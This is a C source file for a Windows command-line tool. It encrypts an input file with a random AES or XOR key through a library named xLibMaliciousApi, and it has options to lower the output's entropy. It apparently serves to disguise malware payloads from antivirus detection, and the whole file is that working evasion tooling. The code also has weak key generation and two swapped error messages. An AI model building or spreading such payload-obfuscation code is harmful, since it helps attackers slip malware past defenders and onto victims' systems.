#include <stdint.h>
#include <stdio.h>

#include "xLibMaliciousApi.h"



int wmain(int argc, wchar_t* argv[])
{
	if (argc != 6)
	{
		wprintf(L"Arguments: [--aes][--xor] [--entropy-default][--entropy-reduce][--entropy-reduce-more] <full\\path\\to\\input.file> <full\\path\\to\\key.file> <full\\path\\to\\mess.file>\n");

		return ERROR_INVALID_PARAMETER;
	}

	int result = ERROR_GEN_FAILURE;

	const wchar_t* mode = argv[1];

	const wchar_t* entropy = argv[2];

	const wchar_t* fileNameIn = argv[3];
	
	const wchar_t* fileNameKey = argv[4];

	const wchar_t* fileNameOut = argv[5];

	FILE* fileIn = _wfopen(fileNameIn, L"rb");
	
	if (fileIn)
	{
		FILE* fileKey = _wfopen(fileNameKey, L"wb");

		if (fileKey)
		{
			FILE* fileOut = _wfopen(fileNameOut, L"wb");

			if (fileOut)
			{
				fseek(fileIn, 0, SEEK_END);

				uint32_t plainSize = ftell(fileIn);

				rewind(fileIn);

				if (plainSize)
				{
					uint8_t* plain = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(plainSize);

					if (plain)
					{
						if (fread(plain, 1, plainSize, fileIn) == plainSize)
						{
							srand(GetTickCount());

							if (_wcsicmp(mode, L"--aes") == 0)
							{
								uint8_t key[32];

								for (uint32_t i = 0; i < sizeof(key); i++)
								{
									key[i] = rand() % 0xff;
								}

								fwrite(key, 1, sizeof(key), fileKey);

								uint8_t* obfuscated = NULL;

								size_t obfuscatedSize = 0;

								xObfuscationEntropy e = xObfuscationEntropyDefault;

								if (_wcsicmp(entropy, L"--entropy-reduce") == 0)
								{
									e = xObfuscationEntropyReduce;
								}
								else if (_wcsicmp(entropy, L"--entropy-reduce-more") == 0)
								{
									e = xObfuscationEntropyReduceMore;
								}

								if (X_LIB_MALICIOUS_CALL(xObfuscationObfuscateAes)(key, sizeof(key), plain, plainSize, &obfuscated, &obfuscatedSize, e))
								{
									fwrite(obfuscated, 1, obfuscatedSize, fileOut);

									X_LIB_MALICIOUS_CALL(xMemoryFree)(obfuscated);

									result = ERROR_SUCCESS;
								}
							}
							else if (_wcsicmp(mode, L"--xor") == 0)
							{
								uint8_t key;

								key = rand() % 0xff;

								fwrite(&key, 1, sizeof(key), fileKey);

								uint8_t* obfuscated = NULL;

								if (X_LIB_MALICIOUS_CALL(xObfuscationObfuscateXor)(key, plain, plainSize, &obfuscated))
								{
									fwrite(obfuscated, 1, plainSize, fileOut);

									X_LIB_MALICIOUS_CALL(xMemoryFree)(obfuscated);

									result = ERROR_SUCCESS;
								}
							}
						}
						else
						{
							wprintf(L"Could not read input.file\n");
						}

						X_LIB_MALICIOUS_CALL(xMemoryFree)(plain);
					}
				}
				else
				{
					wprintf(L"Size of input.file = 0\n");
				}

				fclose(fileOut);
			}
			else
			{
				wprintf(L"Could not open key.file\n");
			}

			fclose(fileKey);
		}
		else
		{
			wprintf(L"Could not open mess.file\n");
		}

		fclose(fileIn);
	}
	else
	{
		wprintf(L"Could not open input.file\n");
	}
	
	return result;
}